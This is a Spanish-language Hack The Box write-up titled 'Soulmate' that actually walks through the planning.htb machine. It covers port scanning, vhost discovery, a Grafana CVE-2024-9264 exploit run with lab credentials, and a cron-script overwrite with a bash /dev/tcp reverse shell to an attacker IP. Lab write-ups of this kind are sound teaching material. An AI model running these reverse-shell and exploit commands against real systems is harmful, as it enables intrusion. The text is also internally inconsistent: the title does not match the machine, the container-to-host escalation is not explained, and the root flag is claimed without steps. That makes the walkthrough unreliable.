---
title: "Soulmate HTB"
date: "2025-09-10"
description: "Escalada de privilegios en servicio mal configurado. Writeup de HTB."
difficulty: "Intermedio"
tags: ["grafana", "cve-2024-9264", "docker"]
target_ip: "10.10.11.68"
target_domain: "planning.htb"
client_name: "Hack The Box"
status: "Completed" 


---

![Banner SoulMate](/img/soulmatehtb.png)


### 💻 Configuración Inicial

Para asegurar la documentación completa y organizada, se creó la siguiente estructura de carpetas:

```bash
# Script para crear estructura de carpetas
#!/bin/bash

MAQUINA="soulmate" # Ejemplo
mkdir -p "$MAQUINA"/{content,nmap,scripts}

echo "Estructura creada:"
echo "├── $MAQUINA/"
echo "    ├── content/ (Archivos de la web, dumps, etc.)"
echo "    ├── nmap/ (Resultados de escaneos)"
echo "    └── scripts/ (Exploits, shell reversa, linpeas, etc.)"
````

---

### 🔎 Fase 1: Escaneo y Enumeración

#### 🌐 Escaneo de Puertos (`nmap`)

Se realizó un escaneo completo de puertos (`-p-`), seguido de una detección de servicios y scripts comunes (`-sSCV`) en los puertos abiertos.

**Comandos:**

```bash
nmap -sSCV -p- --open -T4 -vvv -n -Pn 10.10.11.68 -oN initial_scan.txt
```

**Resultados Destacados:**

| Puerto | Servicio | Versión | Notas |
| :--- | :--- | :--- | :--- |
| **22/tcp** | `ssh` | OpenSSH 9.6p1 | **OpenSSH 9.6p1** (Ubuntu) |
| **80/tcp** | `http` | nginx 1.24.0 | **nginx 1.24.0** (Ubuntu) |

#### 🔍 Enumeración Web (Puerto 80)

El puerto 80 redirige a `http://planning.htb/`. Se añadió el dominio al archivo `/etc/hosts`.

#### Descubrimiento de Directorios (`gobuster/ffuf`)

Se utilizó **Gobuster** para encontrar rutas:

```bash
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Directorios Encontrados:** `/img`, `/css`, `/lib`, `/js`, `/api`, `/apis`, `/apidocs`.

#### Subdominios y Vhosts

La herramienta **WhatWeb** y la inspección manual revelaron la tecnología web: **Bootstrap**, **JQuery 3.4.1**, **nginx/1.24.0**, y una mención a un posible servicio **Grafana**.

Se realizó un escaneo de subdominios, revelando un host crucial: `grafana.planning.htb`.

```bash
# Comando de ejemplo para vhosts/subdominios
gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

**Subdominio Clave:** `grafana.planning.htb` (Grafana 11.0.0).

-----

### 💥 Fase 2: Explotación (Obtención de Acceso)

#### 🎯 Ataque a Grafana (CVE-2024-9264)

La instancia de **Grafana 11.0.0** en `grafana.planning.htb` <br>
presentaba la **CVE-2024-9264** (Arbitrary File Write / RCE).

**Pasos:**

1.  Se utilizaron las credenciales encontradas (`admin / 0D5oT70Fq13EvB5r`).
2.  Se identificó un *exploit* de Python en GitHub: [https://github.com/nollium/CVE-2024-9264](https://github.com/nollium/CVE-2024-9264).
3.  Se ejecutó el *exploit* con una *reverse shell* de **Perl**.

**Comando de Explotación:**

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'perl rev_perl.sh' http://grafana.planning.htb
```

**Resultado:** Obtención de una *reverse shell* como el usuario **`root`** dentro del contenedor **Docker** de Grafana.

-----

### ⬆️ Fase 3: Escalada de Privilegios (Root)

#### 🚪 Pivoteo y Escape del Contenedor

Una vez dentro del contenedor (como `root`), se ejecutó `linpeas.sh` para buscar *leaks* de información y vectores de escape.

**Apuntes de la Enumeración:**

1.  **Variables de Entorno:** Se encontraron credenciales para otro usuario:
      * `GF_SECURITY_ADMIN_USER=enzo`
      * `GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!`
2.  **Tareas Programadas (`crontab.db`):** Dos tareas llamaron la atención.
      * Una tarea diaria que hace un `docker save` del contenedor `root_grafana`, lo comprime y lo cifra con **`zip -P P4ssw0rdS0pRi0T3c`**.
      * Una tarea recurrente (`* * * * *`) que ejecuta el script `/root/scripts/cleanup.sh`.

#### 🔑 Compromiso de Root (Contenedor)

**Vector de Escalada:** La tarea **Cleanup** se ejecuta cada minuto, y el *script* `/root/scripts/cleanup.sh` es **escribible** por el usuario actual (`root` del contenedor).

**Explotación:**

1.  Se modificó `/root/scripts/cleanup.sh` para contener una *reverse shell* simple.
2.  Al minuto, la *reverse shell* se ejecutó con los privilegios del *host* (debido a cómo Docker ejecuta `cron` en este contexto).

**Script de Modificación (ejemplo):**

```bash
echo "bash -i >& /dev/tcp/10.10.14.X/4445 0>&1" > /root/scripts/cleanup.sh
# Luego, se esperó la conexión en el listener
```

**Credencial Root Final:** Se encontraron contraseñas en el comando `zip` de la tarea de *backup*. Esta podría ser una pista para otras credenciales, o la propia *password* del `root` del *host* (dependiendo de la máquina).

-----

### 📌 Resumen y Conclusiones

| Categoría | Detalle Clave |
| :--- | :--- |
| **Puertos Abiertos** | 22 (SSH), 80 (HTTP/NGINX) |
| **Servicio Clave** | Grafana 11.0.0 en `grafana.planning.htb` |
| **Credenciales Útiles** | `admin:0D5oT70Fq13EvB5r` (Web), `enzo:RioTecRANDEntANT!` (Env Var) |
| **Vulnerabilidad** | **CVE-2024-9264** (RCE en Grafana) |
| **Escalada de Privs** | **Cronjob Escribible** (`/root/scripts/cleanup.sh`) dentro del contenedor. |
| **Flag Root** | Obtenida tras el *escape* del contenedor. |
| **Notas Adicionales** | La *password* `P4ssw0rdS0pRi0T3c` de la tarea de *backup* fue una pista crucial. |
